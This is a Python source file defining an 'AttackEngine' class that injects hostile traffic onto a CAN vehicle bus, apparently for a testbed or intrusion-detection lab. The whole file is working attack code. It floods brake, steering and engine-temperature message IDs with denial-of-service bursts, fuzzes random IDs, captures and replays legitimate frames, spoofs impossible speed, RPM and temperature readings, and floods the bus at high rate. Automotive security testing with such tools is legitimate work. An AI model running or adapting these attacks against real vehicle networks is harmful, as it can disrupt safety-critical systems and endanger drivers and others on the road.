import can
import time
import random
import threading
from datetime import datetime
from config import *

class AttackEngine:
    def __init__(self):
        self.bus = can.interface.Bus(channel=CAN_CHANNEL, interface=CAN_INTERFACE)
        self.is_attacking = False
        self.current_attack = None
        self.attack_thread = None
        self.message_history = []
        
    def start_attack(self, attack_type, duration=None):
        """Start a specific type of attack (sync version)"""
        if self.is_attacking:
            self.stop_attack()
            
        self.current_attack = attack_type
        self.is_attacking = True
        
        attack_methods = {
            "DOS": self._dos_attack,
            "FUZZING": self._fuzzing_attack,
            "REPLAY": self._replay_attack,
            "SPOOFING": self._spoofing_attack,
            "FLOODING": self._flooding_attack
        }
        
        if attack_type in attack_methods:
            self.attack_thread = threading.Thread(
                target=attack_methods[attack_type], 
                args=(duration,)
            )
            self.attack_thread.daemon = True
            self.attack_thread.start()
            print(f"🚨 Started {ATTACK_TYPES[attack_type]['name']} attack")
        else:
            print(f"❌ Unknown attack type: {attack_type}")
            self.is_attacking = False
    
    def stop_attack(self):
        """Stop current attack (sync version)"""
        self.is_attacking = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1)
        print(f"🛑 Stopped {self.current_attack} attack")
        self.current_attack = None
    
    def _send_message(self, msg_id, data, attack_type):
        """Send CAN message with attack metadata"""
        try:
            msg = can.Message(arbitration_id=msg_id, data=data, is_extended_id=False)
            self.bus.send(msg)
            
            # Log attack details
            attack_info = {
                'timestamp': datetime.now(),
                'attack_type': attack_type,
                'msg_id': msg_id,
                'data': list(data)
            }
            self.message_history.append(attack_info)
            
            print(f"{ATTACK_TYPES[attack_type]['icon']} {attack_type}: ID=0x{msg_id:03X}, Data={list(data)}")
            
        except Exception as e:
            print(f"❌ Error sending message: {e}")
    
    def _dos_attack(self, duration):
        """Denial of Service - flood with high-priority messages"""
        start_time = time.time()
        params = ATTACK_PARAMS["DOS"]
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            for _ in range(params["burst_count"]):
                if not self.is_attacking:
                    break
                    
                critical_ids = [CAN_IDS["BRAKE"], CAN_IDS["STEERING"], CAN_IDS["ENGINE_TEMP"]]
                msg_id = random.choice(critical_ids)
                data = [0xFF] * 8
                
                self._send_message(msg_id, data, "DOS")
                time.sleep(params["interval"])
            
            time.sleep(0.1)
    
    def _fuzzing_attack(self, duration):
        """Fuzzing - send random/malformed data"""
        start_time = time.time()
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            # Use random IDs outside normal range
            msg_id = random.randint(0x600, 0x7FF)  # High ID range
            
            # Send malformed data patterns
            patterns = [
                [0xFF] * 8,  # All max values
                [0x00] * 8,  # All zeros
                [random.randint(0, 255) for _ in range(8)],  # Random
                [0xAA, 0x55] * 4,  # Alternating pattern
            ]
            data = random.choice(patterns)
            
            self._send_message(msg_id, data, "FUZZING")
            time.sleep(random.uniform(0.1, 0.3))
    
    def _replay_attack(self, duration):
        """Replay - capture and replay legitimate messages"""
        start_time = time.time()
        params = ATTACK_PARAMS["REPLAY"]
        
        captured_messages = []
        print("📡 Capturing legitimate messages for replay...")
        
        capture_start = time.time()
        while len(captured_messages) < 10 and time.time() - capture_start < 5:
            try:
                msg = self.bus.recv(timeout=1.0)
                if msg and msg.arbitration_id in CAN_IDS.values():
                    captured_messages.append((msg.arbitration_id, list(msg.data)))
            except:
                continue
        
        if not captured_messages:
            captured_messages = [
                (CAN_IDS["SPEED"], [60]),
                (CAN_IDS["RPM"], [0x0F, 0xA0])
            ]
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            for msg_id, data in captured_messages:
                if not self.is_attacking:
                    break
                    
                for _ in range(params["replay_count"]):
                    self._send_message(msg_id, data, "REPLAY")
                    time.sleep(params["interval"])
            
            time.sleep(1)
    
    def _spoofing_attack(self, duration):
        """Spoofing - send fake but realistic-looking data"""
        start_time = time.time()
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            # Send clearly unrealistic values
            attack_scenarios = [
                (CAN_IDS["SPEED"], [min(255, random.randint(250, 255))]),  # Impossible speed
                (CAN_IDS["RPM"], [255, 255]),  # Max RPM bytes
                (CAN_IDS["ENGINE_TEMP"], [min(255, random.randint(150, 200))]),  # Overheating
            ]
            
            msg_id, data = random.choice(attack_scenarios)
            self._send_message(msg_id, data, "SPOOFING")
            time.sleep(random.uniform(0.3, 1.0))
    
    def _flooding_attack(self, duration):
        """Flooding - overwhelm the bus with legitimate-looking messages"""
        start_time = time.time()
        
        # Much faster flooding rate
        message_interval = 0.01  # 100 messages per second
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            for msg_id in CAN_IDS.values():
                if not self.is_attacking:
                    break
                    
                if msg_id == CAN_IDS["SPEED"]:
                    data = [random.randint(0, 120)]  # Normal speed range
                elif msg_id == CAN_IDS["RPM"]:
                    rpm = random.randint(800, 4000)  # Normal RPM range
                    data = list(rpm.to_bytes(2, byteorder='big'))
                else:
                    data = [random.randint(0, 100)]
                
                self._send_message(msg_id, data, "FLOODING")
                time.sleep(message_interval)
    
    def get_attack_status(self):
        """Get current attack status"""
        return {
            'is_attacking': self.is_attacking,
            'current_attack': self.current_attack,
            'messages_sent': len(self.message_history),
            'last_message': self.message_history[-1] if self.message_history else None
        }
    
    def clear_history(self):
        """Clear message history"""
        self.message_history.clear()